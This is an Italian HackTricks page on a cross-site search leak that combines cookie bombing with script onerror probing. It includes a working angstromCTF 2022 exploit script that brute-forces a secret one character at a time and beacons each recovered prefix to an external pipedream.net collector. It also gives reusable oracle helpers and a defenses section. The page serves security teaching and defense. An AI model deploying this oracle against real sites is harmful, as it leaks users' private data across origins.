# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Questa tecnica combina:
- Cookie bombing: riempire il browser della vittima con molti/grandi cookie per l'origine target in modo che le richieste successive colpiscano i limiti del server/della richiesta (dimensione degli header della richiesta, lunghezza dell'URL nei redirect, ecc.).
- Error-event oracle: sondare un endpoint cross-origin con un <script> (o altra risorsa secondaria) e distinguere gli stati con onload vs onerror.

High level idea
- Trova un endpoint target il cui comportamento differisce per due stati che vuoi testare (es., search “hit” vs “miss”).
- Assicurati che il percorso “hit” inneschi una catena di redirect pesante o un URL lungo mentre il percorso “miss” rimane corto. Gonfia gli header della richiesta usando molti cookie in modo che solo il percorso “hit” provochi il fallimento del server con un errore HTTP (es., 431/414/400). L'errore inverte l'evento onerror e diventa un oracolo per XS-Search.

Quando funziona
- Puoi indurre il browser della vittima a inviare cookie al target (es., i cookie sono SameSite=None o puoi impostarli in un contesto first-party tramite un popup window.open).
- Esiste una funzionalità dell'app che puoi abusare per impostare cookie arbitrari (es., “save preference” endpoints che trasformano nomi/valori di input controllati in Set-Cookie) o per effettuare redirect post-auth che incorporano dati controllati dall'attaccante nell'URL.
- Il server reagisce diversamente nei due stati e, con header/URL gonfiati, uno stato supera un limite e restituisce una risposta di errore che innesca onerror.

Nota sugli errori del server usati come oracolo
- 431 Request Header Fields Too Large viene comunemente restituito quando i cookie gonfiano gli header della richiesta; 414 URI Too Long o un 400 specifico del server possono essere restituiti per destinazioni di richiesta lunghe. Qualsiasi di questi risulta in un caricamento di subresource fallito e attiva onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Esempio pratico (angstromCTF 2022)
Lo script seguente (da un writeup pubblico) abusa di una funzionalità che permette all'attaccante di inserire cookie arbitrari, poi carica un cross-origin search endpoint come script. Quando la query è corretta, il server esegue un redirect che, insieme al cookie bloat, supera i limiti del server e restituisce uno stato di errore, quindi script.onerror viene eseguito; altrimenti non accade nulla.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Perché il popup (window.open)?
- I browser moderni bloccano sempre più i third‑party cookies. Aprire una top-level window verso il target rende i cookie first‑party così le Set-Cookie responses dal target rimangono valide, abilitando il cookie-bomb step anche con le restrizioni sui third‑party cookie.

2024–2025 notes on cookie availability
- I browser basati su Chromium inviano ancora comunemente third‑party cookies a meno che l'utente o il sito non optino per il contrario, ma Safari e Firefox bloccano la maggior parte dei third‑party cookies per impostazione predefinita. Pianifica entrambe le opzioni: (1) usa un first‑party cookie planting flow (window.open + auto-submit a un cookie-setting endpoint) e poi (2) fai il probe con una subresource che ha successo solo quando quei cookie vengono inviati. Se i third‑party cookies sono bloccati, sposta il probe in un contesto same-site (es., run the oracle nel popup via un same-site gadget ed exfiltrate the boolean with postMessage o un beacon al tuo server).

Generic probing helper
Se hai già un modo per impostare molti cookie sull'origin target (first-party), puoi riutilizzare questo minimal oracle contro qualsiasi endpoint il cui success/failure porti a diversi esiti di rete (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternativa tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Avanzato: de Bruijn–based cookie packing (CTF-proven)
- Quando l'app ti permette di controllare grandi cookie values, puoi impacchettare guesses in modo efficiente aggiungendo a ogni probe una de Bruijn sequence. Questo mantiene basso l'overhead per‑probe e garantisce che la heavy branch sia costantemente più pesante solo per il prefix corretto. Esempio di generatore per |Σ| simboli di lunghezza n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in pratica: impostare più cookie i cui valori sono prefisso + deBruijn(k,n). Solo quando il prefisso testato è corretto il server prende il percorso "pesante" (es., redirect extra che riflette il cookie o l'URL lungo), il quale, combinato con il cookie bloat, supera i limiti e attiva onerror. Vedi un public solver di LA CTF 2024 che usa questo approccio.

Tips to build the oracle
- Forza lo stato “positivo” affinché sia più pesante: catena un redirect extra solo quando la condizione è vera, oppure fai in modo che l'URL di redirect rifletta input utente non limitato così che cresca con il prefisso indovinato.
- Inflate headers: ripeti il cookie bombing finché non osservi un errore consistente sul percorso “pesante”. I server comunemente limitano la dimensione degli header e falliranno prima quando sono presenti molti cookie.
- Stabilize: esegui più operazioni parallele di impostazione cookie e fai probe ripetuti per mediare il rumore di timing e caching.
- Bust caches and avoid pooling artifacts: aggiungi un `#fragment` casuale o `?r=` agli URL di probe, e preferisci nomi di window distinti quando usi loop con window.open.
- Alternate subresources: se `<script>` è filtrato, prova `<link rel=stylesheet>` o `<img>`. Il booleano onload/onerror è l'oracolo; il contenuto non ha bisogno di essere parsato.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDN e server impongono limiti diversi. A ottobre 2025, Cloudflare documenta 128 KB totali per i request headers (e 16 KB per URL) on the edge, quindi potresti aver bisogno di cookie più numerosi/grandi quando i target sono dietro di esso. Altri stack (es., Apache tramite LimitRequestFieldSize) sono spesso più vicini a ~8 KB per riga di header e riscontreranno errori prima. Adatta la dimensione del bomb di conseguenza. [I documenti Cloudflare mostrano il limite di 128 KB per gli header.]

Related XS-Search tricks
- Oracoli basati sulla lunghezza dell'URL (no cookies necessari) possono essere combinati o usati al loro posto quando puoi forzare un target di request molto lungo:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Rendere le risposte di successo/fallimento indistinguibili:
- Evita redirect condizionali o grandi differenze nella dimensione della risposta tra gli stati. Restituisci lo stesso status, lo stesso Content-Type e una lunghezza del body simile indipendentemente dallo stato.
- Blocca i probe di cross-site subresource:
- SameSite cookies: imposta i cookie sensibili su SameSite=Lax o Strict in modo che richieste di subresource come <script src> non li includano; preferisci Strict per i token di auth quando possibile.
- Fetch Metadata: applica una Resource Isolation Policy per rifiutare i caricamenti di subresource cross-site (es., se Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): imposta CORP: same-origin (o almeno same-site) per endpoint non destinati a essere incorporati come cross-origin subresources.
- X-Content-Type-Options: nosniff e Content-Type corretto sugli endpoint JSON/HTML per evitare comportamenti di load-as-script.
- Riduci l'amplificazione di header/URL:
- Limita il numero/la dimensione dei cookie impostati; sanitizza le funzionalità che trasformano campi form arbitrari in Set-Cookie.
- Normalizza o tronca i dati riflessi nei redirect; evita di incorporare stringhe lunghe controllate dall'attaccante nelle Location URL.
- Mantieni i limiti del server consistenti e fai fallire in modo uniforme (evita pagine di errore speciali solo per un ramo).

Notes
- Questa classe di attacchi è discussa ampiamente come “Error Events” in XS-Leaks. Il passo del cookie-bomb è solo un modo comodo per spingere un solo ramo oltre i limiti del server, producendo un oracolo booleano affidabile.



## Riferimenti
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (comune con molti cookie): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup che mostra un oracolo de Bruijn cookie-bomb: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
